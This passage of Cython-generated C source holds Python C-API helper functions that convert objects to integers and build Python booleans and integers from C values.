    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif 
